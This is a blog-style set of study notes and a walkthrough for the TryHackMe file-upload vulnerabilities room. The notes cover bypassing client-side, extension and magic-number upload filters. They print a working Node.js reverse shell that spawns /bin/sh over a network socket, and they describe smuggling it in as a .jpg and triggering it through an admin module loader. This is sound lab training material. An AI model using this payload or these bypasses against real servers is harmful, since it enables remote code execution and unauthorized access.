---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-09 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-09-tryhackme-complete-beginner.html
author: 100007
---

# TryHackMe: Complete Beginner

**author:** Nathan Acks  
**date:** 2021-10-09

# Upload Vulnerabilities

## Bypassing Client-Side Filtering

How to bypass:

- Just turn off JavaScript.
- Use Burp Suite to modify the incoming page to remove the filter (often needs to be done before the page is loaded).
- Use Burp Suite to modify the file upload _after_ it has passed the filters.
- Use curl to send the file directly to the upload endpoint (make a good upload first to see what that looks like).

To modify the page in Burp Suite, first get the server response by right-clicking on the outgoing intercept and choosing Do intercept \> Response to this request. When we forward the request, the response will then be intercepted, and we can modify it as desired.

NOTE: Burp Suite does not intercept JavaScript files; to do this, we’ll need to modify the proxy’s default file extension filter under “Options”.

Modifying the file upload itself is much easier, as this can be done using Burp Suite’s normal interception flow. Note that Burp Suite _cannot_ attach new files, so we’ll need to modify the upload file (extension, etc.) to get past the filters, then undo our changes in the outgoing request.

Sending a file via curl is basically the same procedure as modify the file upload request, except that we let a good file go through so we can see the upload endpoint and then communicate with that directly.

```
curl -X POST -F "submit=$SUBMIT_VALUE" \
-F "${FILE_INPUT NAME}=@$PATH_TO_FILE" $URL
```

## Bypassing Server-Side Filtering: File Extensions

Basically, bypassing server-side filters is going to involve a lot of trial and error until we figure out what the filter is (and how to work around it).

Note that sometimes developers just check to see if a valid extension exists within a file, so things like reverse-shell.jpg.php will work. Happy days if this is you.

Common file extensions for PHP:

- .php
- .phar
- .phtml
- .pht
- .phps (though I’ve always seen this as _source_ code)
- .php# (where `#` is the running PHP major version)

The trick, of course, is not only that you need to upload your file, but that you need to use an extension that the server will execute!

- [PHP (Wikipedia)](https://en.wikipedia.org/wiki/PHP)

## Bypassing Server-Side Filtering: Magic Numbers

To recap: This is (generally) the first 4 bytes of a file. Apparently, text files don’t have magic number, so one trick you can do is just insert four ASCII characters in the front of your file and then use a hex editor to change them to an appropriate magic number.

[Wikipedia’s list of magic numbers.](https://en.wikipedia.org/wiki/List_of_file_signatures)

The `hexeditor` app is a quick-and-easy hex editor, and `file` can give you a sense of whether you’ve effectively spoofed a file’s magic number.

Note that this can be a lot trickier if you’re not dealing with PHP, since many languages don’t have PHP’s concept of interpreted vs. non-interpreted bits.

## Example Methodology

The `Server` and `X-Powered-By` HTTP headers, if present, can be handy for figuring out what language we’re dealing with.

Since many servers turn off directory indexing and randomize file names, its helpful if we can figure out some place that displays or links to the file we just uploaded. If there’s no option here, gobuster’s -x switch allows a search for specific file extensions (but then the search is _within_ a particular directory).

There’s probably server-side filtering, so bypass everything client-side and then look for an error message. Using curl to hit an endpoint directly is probably not as useful as Burp Suite here… Tricks:

- Use completely valid and invalid extensions to check for the presence of white/blacklists.
- Try changing the magic number of a known good file to see if magic number filtering is in place.

## Challenge

Potentially interesting directories in /content, /assets, /modules, /admin.

The provided wordlist is combinations of three capital letters. The backgrounds files also follow this pattern (ABH.jpg, LKQ.jpg, SAD.jpg, UAD.jpg). All backgrounds are located in the /content directory (and the form says that uploaded files will be added to the slides), so I’ll bet that this is where uploaded files go. I did one good upload (and then a scan with gobuster) to verify this.

The server’s response when loading a page indicates that it is running Express. So we’ll need a Node.js compatible reverse shell. I used the first option from the Reverse Shell Cheat Sheet (note that the port and IP address in line 6 need to be customized).

```
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(1234, "127.0.0.1", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents Node.js from crashing
})();
```

(NOTE: I actually tried the more compact shell listed after this on the Reverse Shell Cheat Sheet, but it didn’t work.)

The /assets/js/upload.js script handles uploads. It requires files less than 400k in size with the first three bytes matching the JPG magic number (these are the only three bytes that are consistent between all JPG magic numbers) and an extension of .jpg or .jpeg.

Initially I tried to add the relevant magic bytes to the front of my JS file with the idea that I would edit them out of the request once they made it through the client-side filtering. However, when I viewed the request I discovered that content was base64 encoded, so I just used `base64 -w 0` to encode the shell _without_ the leading bytes and replaced the uploaded file entirely.

(NOTE: Initially I changed the MIME type to text/plain, but the server rejected this. Leaving it as image/jpeg worked though, no matter what the file extension. Note that the MIME type on the base64-encoded line didn’t seem to matter.)

Re-scanning the /content directory with gobuster for .js files revealed nothing, but rescanning for .jpg revealed that the server was renaming all files with the .jpg extension. Fortunately, the uploaded shell was so much smaller than either the pre-existing images or my uploaded test that it was easy to pick out

THIS IS WHERE I GOT STUCK. I finally wound up looking at the challenge hints, most of which it turned out I’d already figured out. But Hint 9 suggested looking at the /admin page, which I hadn’t bothered to try to visit. LET THAT BE A LESSON TO ME - POKE AROUND MORE!

The admin page indicates that it loads modules, so this is how we’re going to get the Express app to execute the reverse shell (I’d been wondering how I was going to get it loaded into memory up until this point). Loading ../content/XKM.jpg (which is where my shell wound up) in this page resulted popped the shell, after which grabbing the flag was easy.

- [Express](http://expressjs.com/)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [TryHackMe: File Upload Vulnerabilities - Hints](https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/)
